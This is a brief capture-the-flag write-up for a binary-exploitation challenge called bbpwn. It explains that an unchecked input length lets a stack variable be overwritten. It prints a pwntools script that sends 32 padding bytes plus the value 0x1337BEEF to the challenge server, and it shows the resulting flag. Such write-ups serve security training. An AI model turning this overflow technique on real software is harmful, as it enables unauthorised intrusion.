Decompiled main:

![img/bbpwn_0](img/bbpwn_0)

the length of the input is not checked. We can therefore overwrite v5 with 0x1337BEEF

Exploit:

```python
from pwn import *

v5 = 0x1337BEEF

payload = (("A"*32).encode())
payload += p32(v5)

p = remote('challenges.tamuctf.com', 4252)
print(p.recvuntil(': ').decode())
p.sendline(payload)
print(p.recvall().decode())
```

# FLAG
```
gigem{0per4tion_skuld_74757474757275}
```
